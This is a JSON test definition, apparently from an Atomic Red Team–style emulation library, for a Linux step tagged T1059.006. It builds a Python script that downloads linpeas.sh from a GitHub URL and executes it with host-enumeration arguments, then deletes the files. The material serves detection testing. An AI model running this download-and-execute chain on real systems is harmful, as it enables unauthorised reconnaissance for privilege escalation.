@@ -1,0 +1,129 @@
+{
+  "id": "6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8",
+  "name": "Execute Python via scripts",
+  "description": "Create Python file (.py) that downloads and executes shell script via executor arguments",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "978ad7f8-1816-4552-a888-08dfc263be0b",
+      "type": "execute-command",
+      "data": {
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' \u003e #{python_script_name}\necho 'import os' \u003e\u003e #{python_script_name}\necho 'url = \"#{script_url}\"' \u003e\u003e #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' \u003e\u003e #{python_script_name}\necho 'session = requests.session()' \u003e\u003e #{python_script_name}\necho 'source = session.get(url).content' \u003e\u003e #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' \u003e\u003e #{python_script_name}\necho 'fd.write(source)' \u003e\u003e #{python_script_name}\necho 'fd.close()' \u003e\u003e #{python_script_name}\necho 'os.system(malicious_command)' \u003e\u003e #{python_script_name}\n$which_python #{python_script_name}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b91b4291-0fff-47a1-8c98-3e6abbfc4485",
+      "type": "execute-command",
+      "data": {
+        "command": "rm #{python_script_name} #{payload_file_name}  \n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9f583f6b-5ae1-4d2b-995c-47832eb8c124",
+      "name": "Check dependency 1/1",
+      "description": "Requires Python\n",
+      "type": "execute-command",
+      "data": {
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "61a516d9-8ee3-4841-9116-4bdc05276f4c",
+      "name": "Resolve dependency 1/1",
+      "description": "Requires Python\n",
+      "type": "execute-command",
+      "data": {
+        "command": "pip install requests    \n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "df2f5143-7a3f-4ca1-9a4f-770695b72752",
+      "name": "Re-check dependency 1/1",
+      "description": "Requires Python\n",
+      "type": "execute-command",
+      "data": {
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "978ad7f8-1816-4552-a888-08dfc263be0b",
+      "p": "on-success",
+      "o": "b91b4291-0fff-47a1-8c98-3e6abbfc4485"
+    },
+    {
+      "s": "978ad7f8-1816-4552-a888-08dfc263be0b",
+      "p": "on-failure",
+      "o": "b91b4291-0fff-47a1-8c98-3e6abbfc4485"
+    },
+    {
+      "s": "9f583f6b-5ae1-4d2b-995c-47832eb8c124",
+      "p": "on-success",
+      "o": "978ad7f8-1816-4552-a888-08dfc263be0b"
+    },
+    {
+      "s": "9f583f6b-5ae1-4d2b-995c-47832eb8c124",
+      "p": "on-failure",
+      "o": "61a516d9-8ee3-4841-9116-4bdc05276f4c"
+    },
+    {
+      "s": "61a516d9-8ee3-4841-9116-4bdc05276f4c",
+      "p": "on-success",
+      "o": "df2f5143-7a3f-4ca1-9a4f-770695b72752"
+    },
+    {
+      "s": "df2f5143-7a3f-4ca1-9a4f-770695b72752",
+      "p": "on-failure",
+      "o": "978ad7f8-1816-4552-a888-08dfc263be0b"
+    }
+  ],
+  "tags": [
+    "T1059.006",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "payload_file_name",
+      "type": "string",
+      "description": "Shell script file name downloaded from the script_url",
+      "value": "T1059.006-payload"
+    },
+    {
+      "name": "executor",
+      "type": "string",
+      "description": "Payload or script interpreter / executor",
+      "value": "sh"
+    },
+    {
+      "name": "script_args",
+      "type": "string",
+      "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files",
+      "value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
+    },
+    {
+      "name": "python_script_name",
+      "type": "path",
+      "description": "Python script name",
+      "value": "T1059.006.py"
+    },
+    {
+      "name": "script_url",
+      "type": "string",
+      "description": "Shell script public URL",
+      "value": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"
+    }
+  ]
+}
